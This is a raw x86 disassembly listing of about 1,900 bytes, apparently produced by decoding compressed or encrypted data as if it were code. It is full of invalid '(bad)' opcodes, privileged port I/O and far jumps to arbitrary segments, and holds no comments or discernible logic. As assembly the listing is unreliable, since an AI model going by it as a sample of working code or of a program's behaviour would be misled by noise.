  40f689:	and    al,0xe0
  40f68b:	pop    DWORD PTR ds:0x24814eb4
  40f691:	or     ebp,DWORD PTR [esi+0x6d]
  40f694:	and    DWORD PTR gs:[ebx-0x56],edi
  40f698:	xchg   ebp,eax
  40f699:	cld    
  40f69a:	call   0xbb2f:0x403c7ff9
  40f6a1:	lahf   
  40f6a2:	aam    0xa7
  40f6a4:	xchg   edi,eax
  40f6a5:	sub    BYTE PTR [edi+edi*1+0x6e62cfcf],bl
  40f6ac:	mov    dl,0x95
  40f6ae:	int3   
  40f6af:	cwde   
  40f6b0:	lahf   
  40f6b1:	cmp    ch,BYTE PTR [ebp+0x690ac49c]
  40f6b7:	ds int3 
  40f6b9:	out    dx,al
  40f6ba:	or     bh,BYTE PTR [edi]
  40f6bc:	and    al,0xdc
  40f6be:	push   edx
  40f6bf:	loop   0x40f6bb
  40f6c1:	outs   dx,BYTE PTR ds:[esi]
  40f6c2:	pushf  
  40f6c3:	add    al,0x72
  40f6c5:	adc    DWORD PTR ds:0x1b194e43,esi
  40f6cb:	inc    ebp
  40f6cc:	mov    bh,0xb4
  40f6ce:	call   0x7923:0x6a6d6feb
  40f6d5:	or     esi,edi
  40f6d7:	retf   
  40f6d8:	arpl   si,si
  40f6da:	out    dx,eax
  40f6db:	pop    esp
  40f6dc:	lds    ecx,FWORD PTR [esp+eax*4+0x7e31f17]
  40f6e3:	int3   
  40f6e4:	mov    cl,0x68
  40f6e6:	cs hlt 
  40f6e8:	fdiv   st,st(2)
  40f6ea:	scas   eax,DWORD PTR es:[edi]
  40f6eb:	xor    al,0x7a
  40f6ed:	mov    esi,0x4ee7a79d
  40f6f2:	pop    ebx
  40f6f3:	mul    DWORD PTR [ebx]
  40f6f5:	(bad)  
  40f6f6:	in     eax,dx
  40f6f7:	pusha  
  40f6f8:	mov    dl,0xc4
  40f6fa:	loop   0x40f684
  40f6fc:	arpl   WORD PTR [ecx],si
  40f6fe:	pop    ds
  40f6ff:	adc    DWORD PTR [esi-0x29b314f5],ecx
  40f705:	rol    BYTE PTR [ecx],1
  40f707:	cmp    DWORD PTR [esi-0x76fe3d48],0xb
  40f70e:	add    eax,0xc1ef8145
  40f713:	shl    DWORD PTR [ebx+0x0],0xc2
  40f717:	inc    edi
  40f718:	sbb    ebx,esp
  40f71a:	call   0xb750:0xf3ffab9b
  40f721:	mov    ah,0x2e
  40f723:	sbb    al,bh
  40f725:	xor    ebx,DWORD PTR [edx+0x53]
  40f728:	test   al,0xac
  40f72a:	xchg   ebp,eax
  40f72b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f72c:	cmp    edi,DWORD PTR [esi-0x6cb62b25]
  40f732:	sub    eax,0x338de547
  40f737:	sub    esi,DWORD PTR [ecx-0x5a18aefb]
  40f73d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f73e:	pop    ecx
  40f73f:	inc    edi
  40f740:	loop   0x40f732
  40f742:	not    ah
  40f744:	dec    edi
  40f745:	or     eax,edx
  40f747:	nop
  40f748:	push   dx
  40f74a:	jbe    0x40f7ab
  40f74c:	inc    edx
  40f74d:	push   ecx
  40f74e:	call   0x3cd6:0x5baa15c8
  40f755:	in     eax,dx
  40f756:	mov    ch,0xa4
  40f758:	loopne 0x40f6e9
  40f75a:	mov    edx,0x1a41a39b
  40f75f:	inc    ebx
  40f760:	mov    WORD PTR [eax-0x1e874a66],ss
  40f766:	inc    ecx
  40f767:	fisubr DWORD PTR [esi-0x31a6b1fe]
  40f76d:	or     esi,DWORD PTR [esi]
  40f76f:	fld    st(0)
  40f771:	test   edx,esi
  40f773:	mov    edi,0x959b53e6
  40f778:	daa    
  40f779:	cs pop ebp
  40f77b:	sub    bh,ah
  40f77d:	mov    cs,WORD PTR [esi-0x24]
  40f780:	fmul   DWORD PTR [ebx]
  40f782:	pop    edi
  40f783:	ss mov eax,0x4fb5c8d7
  40f789:	push   cs
  40f78a:	popf   
  40f78b:	js     0x40f720
  40f78d:	clc    
  40f78e:	lods   eax,DWORD PTR ds:[esi]
  40f78f:	mov    esi,0x1be377d2
  40f794:	ror    BYTE PTR [ebx],0x11
  40f797:	mov    ecx,0xc57baae5
  40f79c:	add    esp,DWORD PTR [ebp+0x3762969a]
  40f7a2:	xor    BYTE PTR [ecx-0x58c53119],dl
  40f7a8:	jo     0x40f7a8
  40f7aa:	push   esp
  40f7ab:	sub    DWORD PTR [esi-0x4aeadff1],eax
  40f7b1:	out    dx,eax
  40f7b2:	and    edi,DWORD PTR [edx-0x1b]
  40f7b5:	neg    DWORD PTR [ebx-0x54a2d51b]
  40f7bb:	or     eax,0xa75d7482
  40f7c0:	xor    DWORD PTR [esi],edi
  40f7c2:	gs jno 0x40f7bd
  40f7c5:	cmp    edi,DWORD PTR [ebx]
  40f7c7:	xchg   BYTE PTR [edx+0x7c2cfdc3],dh
  40f7cd:	aad    0xd6
  40f7cf:	add    ch,BYTE PTR [edx-0x6a19faf5]
  40f7d5:	jae    0x40f817
  40f7d7:	in     al,dx
  40f7d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7d9:	mov    ebx,DWORD PTR [ebx+0x53ddf5b8]
  40f7df:	mov    ebx,0x38ea6e3d
  40f7e4:	test   BYTE PTR [edx],0xf3
  40f7e7:	inc    edx
  40f7e8:	aad    0x99
  40f7ea:	lea    edi,[ecx]
  40f7ec:	xchg   ecx,eax
  40f7ed:	out    0x2f,eax
  40f7ef:	xchg   ebp,eax
  40f7f0:	and    ch,BYTE PTR [ebp+0x53dccb9a]
  40f7f6:	jo     0x40f803
  40f7f8:	sbb    esi,DWORD PTR [edx-0x5d]
  40f7fb:	mov    ds:0x2a38ba00,al
  40f800:	pushf  
  40f801:	hlt    
  40f802:	dec    edx
  40f803:	int3   
  40f804:	mov    edi,0x55a455bf
  40f809:	xor    eax,0x8c041f48
  40f80e:	sbb    cl,BYTE PTR [edx]
  40f810:	rcl    BYTE PTR [ebp-0x6d],cl
  40f813:	mov    eax,ds:0x27bd9aa9
  40f818:	shl    BYTE PTR [eax],1
  40f81a:	nop
  40f81b:	aas    
  40f81c:	add    cl,BYTE PTR [ebx]
  40f81e:	adc    al,BYTE PTR [edi+0x73]
  40f821:	or     edi,ebp
  40f823:	cmp    dh,al
  40f825:	cmp    bl,BYTE PTR [ebp-0x2e8565a4]
  40f82b:	ins    DWORD PTR es:[edi],dx
  40f82c:	add    edx,edx
  40f82e:	lea    esi,[esi+ecx*2]
  40f831:	mov    al,ds:0x7c4a76b
  40f836:	outs   dx,DWORD PTR ds:[esi]
  40f837:	dec    edi
  40f838:	leave  
  40f839:	cmp    al,0x34
  40f83b:	(bad)  [edx+0x4def6447]
  40f841:	ret    
  40f842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f843:	jo     0x40f806
  40f845:	or     ecx,DWORD PTR [ecx]
  40f847:	imul   esi,DWORD PTR [edx-0x17],0x1da3ce94
  40f84e:	loop   0x40f827
  40f850:	mov    dl,0xce
  40f852:	shl    DWORD PTR [ecx+0xe],1
  40f855:	push   esp
  40f856:	frstor [eax-0x50cbf4d0]
  40f85c:	sub    al,0x72
  40f85e:	dec    ebp
  40f85f:	sbb    BYTE PTR [ecx-0x3ede65f8],ch
  40f865:	mov    ds:0x42ce4fa9,eax
  40f86a:	pop    edi
  40f86b:	popf   
  40f86c:	cmp    bl,BYTE PTR [eax-0x66]
  40f86f:	or     BYTE PTR [esp+ebx*2],al
  40f872:	mov    ds:0x9ad68ca4,al
  40f877:	mov    dl,cl
  40f879:	outs   dx,BYTE PTR ds:[esi]
  40f87a:	fs jno 0x40f8ef
  40f87d:	imul   esp,DWORD PTR ds:[ebp-0x1c3a71ea],0xffffffad
  40f885:	xchg   edx,eax
  40f886:	fcmovu st,st(3)
  40f888:	jge    0x40f903
  40f88a:	jl     0x40f84c
  40f88c:	mov    dl,0x86
  40f88e:	mov    ebp,0xa713dec8
  40f893:	jns    0x40f863
  40f895:	or     eax,DWORD PTR [ecx-0x2e]
  40f898:	pop    edx
  40f899:	ret    0x9405
  40f89c:	in     eax,dx
  40f89d:	and    BYTE PTR [edx-0x8432924],bl
  40f8a3:	mov    ah,ch
  40f8a5:	stos   DWORD PTR es:[edi],eax
  40f8a6:	sbb    ah,BYTE PTR [esi-0x19b9a82e]
  40f8ac:	mov    ebp,0x74332f5
  40f8b1:	rcr    DWORD PTR [edx-0x94f9a61],0x99
  40f8b8:	and    esp,DWORD PTR [eax-0x44025829]
  40f8be:	xchg   ebp,eax
  40f8bf:	jns    0x40f876
  40f8c1:	not    DWORD PTR [ecx]
  40f8c3:	mov    esp,0x1c68fbb1
  40f8c8:	add    al,0x9e
  40f8ca:	dec    ecx
  40f8cb:	fwait
  40f8cc:	cs out 0x1a,eax
  40f8cf:	mov    esi,0xab33cd53
  40f8d4:	lock xchg edx,eax
  40f8d6:	popf   
  40f8d7:	lahf   
  40f8d8:	fidiv  DWORD PTR ds:[esi-0x77390d68]
  40f8df:	jae    0x40f8cb
  40f8e1:	icebp  
  40f8e2:	sub    eax,0xfe7ad9a9
  40f8e7:	jnp    0x40f8d5
  40f8e9:	mov    al,0x91
  40f8eb:	mov    bh,0x85
  40f8ed:	mov    cl,dl
  40f8ef:	cmp    BYTE PTR [edx+0x19451e5e],dh
  40f8f5:	or     DWORD PTR [esi],ebp
  40f8f7:	cmp    edx,edx
  40f8f9:	or     ebp,ecx
  40f8fb:	xchg   edi,eax
  40f8fc:	aaa    
  40f8fd:	add    al,0xbb
  40f8ff:	inc    esp
  40f900:	ins    DWORD PTR es:[edi],dx
  40f901:	inc    esi
  40f902:	call   0x4fa:0xa82285bf
  40f909:	add    eax,0xb4adb91
  40f90e:	mov    dl,0x8d
  40f910:	push   edx
  40f911:	mov    cl,0xcc
  40f913:	sahf   
  40f914:	ret    
  40f915:	sub    ebx,DWORD PTR [ebx-0x7a243739]
  40f91b:	fcmovne st,st(5)
  40f91d:	(bad)  
  40f91e:	cli    
  40f91f:	xchg   BYTE PTR [esi],bh
  40f921:	or     ebx,ebx
  40f923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f924:	fbstp  TBYTE PTR [ebp+0xd]
  40f927:	push   es
  40f928:	aas    
  40f929:	ds call 0xf63b:0x8cb1b419
  40f931:	pop    ss
  40f932:	imul   esp,DWORD PTR [edi+0x252dc91a],0x3acf2964
  40f93c:	mov    dl,0xea
  40f93e:	fs pop esi
  40f940:	xchg   BYTE PTR [ebp+0xc2a08ea],ch
  40f946:	in     eax,dx
  40f947:	and    DWORD PTR [edi+0x21b79840],ebp
  40f94d:	sub    al,0xd0
  40f94f:	push   edx
  40f950:	mov    dl,0x1d
  40f952:	popf   
  40f953:	xchg   ebp,eax
  40f954:	jl     0x40f917
  40f956:	cdq    
  40f957:	add    ah,ch
  40f959:	fwait
  40f95a:	jb     0x40f903
  40f95c:	mov    esp,0xcb627bad
  40f961:	and    dh,ah
  40f963:	or     al,0xc3
  40f965:	xchg   edi,eax
  40f966:	pop    edx
  40f967:	cmp    eax,0x524d19d7
  40f96c:	xor    DWORD PTR [ebx],ecx
  40f96e:	fidiv  WORD PTR [ecx+0x23]
  40f971:	outs   dx,DWORD PTR ds:[esi]
  40f972:	dec    edx
  40f973:	jbe    0x40f991
  40f975:	xor    ebx,DWORD PTR [edx-0x3a1baed6]
  40f97b:	or     ecx,edi
  40f97d:	scas   eax,DWORD PTR es:[edi]
  40f97e:	cmp    al,0x9f
  40f980:	xchg   ecx,eax
  40f981:	out    dx,al
  40f982:	mov    ds:0xab62327f,eax
  40f987:	cmc    
  40f988:	not    DWORD PTR [ebp-0x65]
  40f98b:	ins    BYTE PTR es:[edi],dx
  40f98c:	mov    dl,0x8e
  40f98e:	cmp    BYTE PTR [eax-0x18],dh
  40f991:	loope  0x40f9c1
  40f993:	fcomp  QWORD PTR [ebp+0xb]
  40f996:	daa    
  40f997:	popf   
  40f998:	adc    eax,0x8e19d5f
  40f99d:	test   DWORD PTR [ebp-0x4bbda885],ebx
  40f9a3:	hlt    
  40f9a4:	repnz push 0xffffff9b
  40f9a7:	stos   DWORD PTR es:[edi],eax
  40f9a8:	nop
  40f9a9:	or     ecx,DWORD PTR [ecx-0x6ee4b905]
  40f9af:	jbe    0x40f9de
  40f9b1:	imul   ebx,DWORD PTR [edx+0x3ab30f50],0xffffffcd
  40f9b8:	aam    0xe6
  40f9ba:	das    
  40f9bb:	mov    al,ds:0xe217f016
  40f9c0:	cmp    eax,0x814991ab
  40f9c5:	push   esi
  40f9c6:	test   BYTE PTR [edi],ah
  40f9c8:	and    eax,0xc0841a77
  40f9cd:	ficom  DWORD PTR [esp+ecx*8-0x583e18f3]
  40f9d4:	pop    ds
  40f9d5:	leave  
  40f9d6:	mov    gs,WORD PTR [esi]
  40f9d8:	icebp  
  40f9d9:	call   0x23f149f8
  40f9de:	xchg   BYTE PTR [esi],cl
  40f9e0:	es push ecx
  40f9e2:	ins    BYTE PTR es:[edi],dx
  40f9e3:	inc    esi
  40f9e4:	rcr    BYTE PTR [ecx+0x66],1
  40f9e7:	jo     0x40f98a
  40f9e9:	or     cl,dl
  40f9eb:	sti    
  40f9ec:	add    eax,0x73d896ee
  40f9f1:	cmp    edx,DWORD PTR [edi+edi*8-0x3b]
  40f9f5:	imul   ebx,DWORD PTR [edx-0x60b335d7],0x706750e3
  40f9ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa00:	call   0x23a42482
  40fa05:	xchg   esi,eax
  40fa06:	and    eax,0xe934b0c7
  40fa0b:	out    0xa9,eax
  40fa0d:	pop    ebx
  40fa0e:	or     eax,0x3b1b02e7
  40fa13:	mov    al,ds:0x5e167c6a
  40fa18:	mov    ecx,DWORD PTR fs:[edi+0x7a]
  40fa1c:	not    al
  40fa1e:	call   0xa95a:0x2ff544ae
  40fa25:	pop    es
  40fa26:	inc    edx
  40fa27:	stos   DWORD PTR es:[edi],eax
  40fa28:	jge    0x40f9dc
  40fa2a:	data16 stc 
  40fa2c:	inc    esi
  40fa2d:	sti    
  40fa2e:	popf   
  40fa2f:	cmp    DWORD PTR [eax-0x6d821e1c],edi
  40fa35:	pop    esi
  40fa36:	mov    esi,0x210c87d5
  40fa3b:	xor    al,0xe
  40fa3d:	loope  0x40fa36
  40fa3f:	loopne 0x40f9fa
  40fa41:	mov    ebx,0x47460a0c
  40fa46:	call   0xe5d5:0xf37490f4
  40fa4d:	push   ebp
  40fa4e:	and    ah,BYTE PTR [edi+0x2da9f7b4]
  40fa54:	jge    0x40fa0b
  40fa56:	neg    BYTE PTR [eax+0x4b7b6cb2]
  40fa5c:	xchg   BYTE PTR [edi-0x69],ch
  40fa5f:	fidivr DWORD PTR [edx-0x3dc633f6]
  40fa65:	ret    
  40fa66:	mov    ecx,0x8e3b6b8d
  40fa6b:	cld    
  40fa6c:	lods   eax,DWORD PTR ds:[esi]
  40fa6d:	into   
  40fa6e:	or     edi,ecx
  40fa70:	std    
  40fa71:	nop
  40fa72:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40fa74:	adc    al,0x55
  40fa76:	xchg   DWORD PTR [esi+ebp*1-0x1a8ea8f5],eax
  40fa7d:	lahf   
  40fa7e:	mov    ds,edi
  40fa80:	test   al,0xbf
  40fa82:	xchg   ebp,eax
  40fa83:	push   ds
  40fa84:	frstor [edi]
  40fa86:	jmp    0xf0a0:0xaafd5707
  40fa8d:	push   ss
  40fa8e:	inc    esi
  40fa8f:	sbb    eax,0x3fc9f13
  40fa94:	mov    dl,0xcc
  40fa96:	nop
  40fa97:	(bad)  
  40fa98:	les    eax,FWORD PTR [esi-0x7e4de3b8]
  40fa9e:	sbb    BYTE PTR [edx],bh
  40faa0:	shl    BYTE PTR [ebx],1
  40faa2:	mov    bl,0xd3
  40faa4:	sbb    eax,0x7263b40b
  40faa9:	push   edi
  40faaa:	rol    DWORD PTR [ebx+0x51],0xb0
  40faae:	js     0x40fb20
  40fab0:	mov    dl,0xf3
  40fab2:	or     ebp,DWORD PTR [edi]
  40fab4:	add    al,0x80
  40fab6:	call   esi
  40fab8:	mov    WORD PTR [edx],cs
  40faba:	add    eax,0xb3b8e5ab
  40fabf:	js     0x40faed
  40fac1:	and    al,0x3a
  40fac3:	shl    BYTE PTR ds:0xd77e2c19,0xb
  40faca:	repz enter 0xba3f,0x6e
  40facf:	ins    BYTE PTR es:[edi],dx
  40fad0:	mov    dl,0x14
  40fad2:	imul   eax,DWORD PTR [esi],0xd8fbdc32
  40fad8:	dec    BYTE PTR [ebx]
  40fada:	mov    bh,BYTE PTR [ebx+eiz*1+0x4e]
  40fade:	cdq    
  40fadf:	mov    edx,0x6aa64beb
  40fae4:	dec    ebx
  40fae5:	push   ss
  40fae6:	cwde   
  40fae7:	imul   ebp,ebp,0xffffff8e
  40faea:	fidivr DWORD PTR [edi-0x552ed34a]
  40faf0:	test   ch,dh
  40faf2:	mov    ch,BYTE PTR [eax+0x69d65974]
  40faf8:	push   edx
  40faf9:	xchg   esp,eax
  40fafa:	das    
  40fafb:	and    dl,BYTE PTR [ebx+ecx*8-0x3367a366]
  40fb02:	cld    
  40fb03:	jmp    0xa835a3c6
  40fb08:	les    ebx,FWORD PTR [eax]
  40fb0a:	jecxz  0x40fb47
  40fb0c:	ret    
  40fb0d:	fidiv  WORD PTR [eax-0x4e]
  40fb10:	mov    dl,0x1d
  40fb12:	jl     0x40fac0
  40fb14:	mov    edi,0x71b556d2
  40fb19:	or     edi,DWORD PTR ds:0x98fb3929
  40fb1f:	cdq    
  40fb20:	repnz das 
  40fb22:	popf   
  40fb23:	mov    ds:0x780d99d3,al
  40fb28:	bound  esi,QWORD PTR [ecx]
  40fb2a:	jp     0x40fb84
  40fb2c:	fmul   QWORD PTR [edi]
  40fb2e:	mov    edx,0x55099aaa
  40fb33:	addr16 cmps DWORD PTR ds:[si],DWORD PTR es:[di]
  40fb36:	jmp    DWORD PTR [ecx-0x2e]
  40fb39:	imul   ebp,DWORD PTR [esi-0x5c667ad1],0xcd1eeda7
  40fb43:	xchg   esp,eax
  40fb44:	fwait
  40fb45:	xchg   edx,eax
  40fb46:	xchg   ebx,eax
  40fb47:	(bad)  
  40fb48:	mov    dl,0x5b
  40fb4a:	pop    esi
  40fb4b:	loope  0x40fb33
  40fb4d:	add    al,0x3a
  40fb4f:	cmp    DWORD PTR [eax],edx
  40fb51:	or     esp,ebp
  40fb53:	pop    esp
  40fb54:	fs ret 
  40fb56:	pop    esp
  40fb57:	pop    ss
  40fb58:	(bad)  
  40fb59:	int3   
  40fb5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb5b:	and    DWORD PTR [esp+eax*4],ecx
  40fb5e:	jbe    0x40fbca
  40fb60:	push   esi
  40fb61:	imul   edx,edx,0xffffffc5
  40fb64:	and    esi,DWORD PTR [ecx-0x60]
  40fb67:	inc    ebp
  40fb68:	scas   eax,DWORD PTR es:[edi]
  40fb69:	or     ecx,DWORD PTR [esp+ebp*8+0x2e]
  40fb6d:	cmp    eax,0x6d22c6bf
  40fb72:	jmp    0x40fb79
  40fb74:	mov    dl,0xf8
  40fb76:	(bad)  
  40fb77:	adc    ebx,esi
  40fb79:	test   al,0x40
  40fb7b:	pop    ebp
  40fb7c:	mov    al,0xb
  40fb7e:	cmp    eax,0x921abf67
  40fb83:	loope  0x40fbad
  40fb85:	fstp   DWORD PTR [edx-0x5ffe184f]
  40fb8b:	dec    ebp
  40fb8c:	jmp    0xe540:0x474a376b
  40fb93:	pop    es
  40fb94:	bound  esi,QWORD PTR [esi+0x4675119a]
  40fb9a:	into   
  40fb9b:	adc    edx,DWORD PTR [eax]
  40fb9d:	leave  
  40fb9e:	sti    
  40fb9f:	mov    ds:0xcc89d9d7,eax
  40fba4:	aad    0x8b
  40fba6:	adc    esi,DWORD PTR [eax-0x1c]
  40fba9:	or     BYTE PTR [ecx+edx*4+0x75bef388],dh
  40fbb0:	mov    ebp,0x6e87fc76
  40fbb5:	inc    ebp
  40fbb6:	mov    cl,0x51
  40fbb8:	xor    BYTE PTR [ebx],cl
  40fbba:	pop    edx
  40fbbb:	daa    
  40fbbc:	addr16 arpl bx,cx
  40fbbf:	inc    ebp
  40fbc0:	dec    eax
  40fbc1:	mov    ds:0x91a46502,al
  40fbc6:	push   esi
  40fbc7:	sub    BYTE PTR [ebp-0x2d743be5],dh
  40fbcd:	jecxz  0x40fb90
  40fbcf:	rcr    ebx,1
  40fbd1:	or     eax,DWORD PTR [edi+ebx*1+0x66]
  40fbd5:	xor    DWORD PTR [ebp-0x651236ec],eax
  40fbdb:	aad    0xf4
  40fbdd:	ins    DWORD PTR es:[edi],dx
  40fbde:	(bad)  
  40fbdf:	xor    al,bh
  40fbe1:	inc    DWORD PTR [edx-0x58]
  40fbe4:	ror    ch,1
  40fbe6:	add    eax,0x8ee132f6
  40fbeb:	pop    ebx
  40fbec:	mov    ds:0x6969a34f,al
  40fbf1:	add    al,0xe5
  40fbf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbf4:	sub    ebp,ebx
  40fbf6:	imul   esi,DWORD PTR [edx-0x69],0xffffffff
  40fbfa:	mov    al,0xa7
  40fbfc:	imul   DWORD PTR [ebx]
  40fbfe:	rcl    DWORD PTR [ebx+edx*8-0x73c07b85],0x9
  40fc06:	lea    esp,[edi+0x260c9bc3]
  40fc0c:	fld    QWORD PTR [edi+0x5a]
  40fc0f:	pop    ebp
  40fc10:	or     BYTE PTR [ecx],al
  40fc12:	xchg   BYTE PTR [ebx-0xf],al
  40fc15:	mov    ds:0xcbf2b831,al
  40fc1a:	out    0xb1,al
  40fc1c:	adc    eax,0xb25639fb
  40fc21:	push   edi
  40fc22:	les    ebx,FWORD PTR [ebx*1+0xd5840ea]
  40fc29:	jb     0x40fbea
  40fc2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc2c:	rol    edx,cl
  40fc2e:	lods   al,BYTE PTR ds:[esi]
  40fc2f:	in     eax,0xea
  40fc31:	test   BYTE PTR [ecx+0x4529b28f],al
  40fc37:	gs dec ecx
  40fc39:	pushf  
  40fc3a:	add    eax,0x8081a14
  40fc3f:	out    0xf7,al
  40fc41:	mov    dh,0x26
  40fc43:	push   esp
  40fc44:	inc    edx
  40fc45:	out    0x89,eax
  40fc47:	aas    
  40fc48:	and    bh,BYTE PTR [ebx+0x745a599a]
  40fc4e:	inc    eax
  40fc4f:	lea    esp,[esi-0x2e]
  40fc52:	push   ecx
  40fc53:	push   ebp
  40fc54:	in     al,dx
  40fc55:	pop    ss
  40fc56:	aad    0x25
  40fc58:	sbb    BYTE PTR [ebp-0x3d2458c3],dl
  40fc5e:	shl    DWORD PTR [esi],cl
  40fc60:	xchg   edx,eax
  40fc61:	ins    BYTE PTR es:[edi],dx
  40fc62:	test   DWORD PTR [edx-0x13a43b21],ecx
  40fc68:	cwde   
  40fc69:	mov    al,ds:0x8b9961c7
  40fc6e:	pop    edx
  40fc6f:	add    ebx,eax
  40fc71:	xchg   esp,eax
  40fc72:	ins    BYTE PTR es:[edi],dx
  40fc73:	aaa    
  40fc74:	add    al,BYTE PTR [edx]
  40fc76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc77:	and    DWORD PTR [esi],ebp
  40fc79:	pushf  
  40fc7a:	enter  0xb2fb,0xcb
  40fc7e:	loope  0x40fcab
  40fc80:	jle    0x40fcb4
  40fc82:	add    ah,BYTE PTR [edi+0x66b4c894]
  40fc88:	add    esi,DWORD PTR [esi+esi*4-0x70]
  40fc8c:	lods   eax,DWORD PTR ds:[esi]
  40fc8d:	clc    
  40fc8e:	stc    
  40fc8f:	pop    ecx
  40fc90:	jb     0x40fc2c
  40fc92:	retf   
  40fc93:	sub    bl,bl
  40fc95:	jo     0x40fd0a
  40fc97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc98:	(bad)  
  40fc99:	and    al,0xd1
  40fc9b:	ret    0x4231
  40fc9e:	jmp    0x40fc4c
  40fca0:	mov    cl,0x8
  40fca2:	push   0x7ce42e14
  40fca7:	push   edi
  40fca8:	clc    
  40fca9:	jmp    0xb053a04d
  40fcae:	stos   BYTE PTR es:[edi],al
  40fcaf:	jmp    0xdd5c:0x90b0cb11
  40fcb6:	call   0xda86:0x829b78b2
  40fcbd:	loopne 0x40fcf9
  40fcbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc0:	xor    BYTE PTR [ebx-0x4f],0xd8
  40fcc4:	test   bp,dx
  40fcc7:	lds    ecx,FWORD PTR [edx]
  40fcc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcca:	cdq    
  40fccb:	mov    DWORD PTR [edx],0x5420e3fd
  40fcd1:	rcl    BYTE PTR [edx+0x3f],1
  40fcd4:	mov    edx,0x7dd6d4e1
  40fcd9:	or     edi,DWORD PTR [ebx]
  40fcdb:	and    ebp,edi
  40fcdd:	cmp    al,0x29
  40fcdf:	pop    esi
  40fce0:	lods   eax,DWORD PTR ds:[esi]
  40fce1:	stc    
  40fce2:	popf   
  40fce3:	loope  0x40fd1c
  40fce5:	ficomp DWORD PTR [ebx]
  40fce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fce8:	mov    dl,0xb9
  40fcea:	and    eax,ebx
  40fcec:	push   ds
  40fced:	jo     0x40fd69
  40fcef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcf0:	cs bswap ebp
  40fcf3:	xlat   BYTE PTR ds:[ebx]
  40fcf4:	lds    edx,FWORD PTR [esp+esi*2+0x7f]
  40fcf8:	mov    esp,0xb5279a89
  40fcfd:	or     eax,0x70181149
  40fd02:	ins    DWORD PTR es:[edi],dx
  40fd03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd04:	dec    edx
  40fd05:	xor    BYTE PTR [eax+0x0],bh
  40fd08:	jp     0x40fd58
  40fd0a:	sub    BYTE PTR [esi-0x4e],al
  40fd0d:	sbb    bh,BYTE PTR [esi]
  40fd0f:	jae    0x40fd7f
  40fd11:	(bad)
  40fd14:	ins    BYTE PTR es:[edi],dx
  40fd15:	add    bl,BYTE PTR [ebx-0x650c26cc]
  40fd1b:	cmp    eax,0x86016f45
  40fd20:	mov    dl,0xa8
  40fd22:	sub    ebx,esi
  40fd24:	data16 sub al,0xd6
  40fd27:	fild   WORD PTR [eax+0xb]
  40fd2a:	dec    edx
  40fd2b:	sbb    al,0x3f
  40fd2d:	dec    edi
  40fd2e:	inc    edi
  40fd30:	dec    esp
  40fd31:	out    dx,al
  40fd32:	xchg   esp,eax
  40fd33:	aam    0x6f
  40fd35:	(bad)  
  40fd36:	dec    edi
  40fd37:	out    0x51,eax
  40fd39:	cmp    al,0x59
  40fd3b:	sub    eax,0x67700bf4
  40fd40:	retf   
  40fd41:	in     eax,0x99
  40fd43:	sub    esi,DWORD PTR [esi]
  40fd45:	test   eax,0xf8e03894
  40fd4a:	pop    edi
  40fd4b:	out    0x92,al
  40fd4d:	ret    0x1c14
  40fd50:	ret    0x7902
  40fd53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd54:	inc    ebx
  40fd55:	jo     0x40fcdb
  40fd57:	pop    ebx
  40fd58:	fdiv   DWORD PTR [edx+0x36]
  40fd5b:	ja     0x40fd38
  40fd5d:	fstp   QWORD PTR [edx-0x624475b4]
  40fd63:	mov    ah,dh
  40fd65:	retf   
  40fd66:	push   ecx
  40fd67:	test   al,0x66
  40fd69:	cli    
  40fd6a:	xor    BYTE PTR [edi],bl
  40fd6c:	jno    0x40fd0d
  40fd6e:	mov    ecx,0x343a22a4
  40fd73:	sbb    DWORD PTR [edx-0x3617492f],esi
  40fd79:	cwde   
  40fd7a:	add    eax,0xba08b071
  40fd7f:	ins    DWORD PTR es:[edi],dx
  40fd80:	ss stos BYTE PTR es:[edi],al
  40fd82:	xchg   edx,eax
  40fd83:	out    0x32,eax
  40fd85:	cmp    ebx,ecx
  40fd87:	xlat   BYTE PTR ds:[ebx]
  40fd88:	mov    bl,0x67
  40fd8a:	push   ebx
  40fd8b:	xchg   edx,eax
  40fd8c:	sar    BYTE PTR [eax+0x137ebd81],cl
  40fd92:	xchg   DWORD PTR [edi],esi
  40fd94:	aam    0xb
  40fd96:	(bad)
  40fd99:	dec    edi
  40fd9a:	in     al,dx
  40fd9b:	(bad)  
  40fd9c:	cdq    
  40fd9d:	mov    ds:0xf535cd9a,al
  40fda2:	dec    ebp
  40fda3:	jae    0x40fd33
  40fda5:	push   eax
  40fda6:	clc    
  40fda7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fda8:	push   esp
  40fda9:	fxch   st(4)
  40fdab:	jmp    0x40fe08
  40fdad:	mov    esp,0x6ba5715a
  40fdb2:	mov    ebx,0xd52ab28e
  40fdb7:	retf   0xfd7c
  40fdba:	mov    cl,0xb9
  40fdbc:	cld    
  40fdbd:	loope  0x40fda8
  40fdbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdc0:	xor    esi,ebp
  40fdc2:	sub    ecx,DWORD PTR ds:0xe95aa335
  40fdc8:	shr    BYTE PTR [ecx+0x34],0x82
  40fdcc:	in     eax,0xb
  40fdce:	int3   
  40fdcf:	add    ebp,DWORD PTR [ebx-0x236b348f]
  40fdd5:	aam    0xa2
  40fdd7:	xchg   ecx,eax
  40fdd8:	jle    0x40fd65
  40fdda:	cmp    bl,dl
  40fddc:	pusha  
  40fddd:	test   eax,0x22ea094
  40fde2:	test   BYTE PTR [esi+0x7],dl
  40fde5:	xor    DWORD PTR [edx+0x5a2b3d4e],ebx
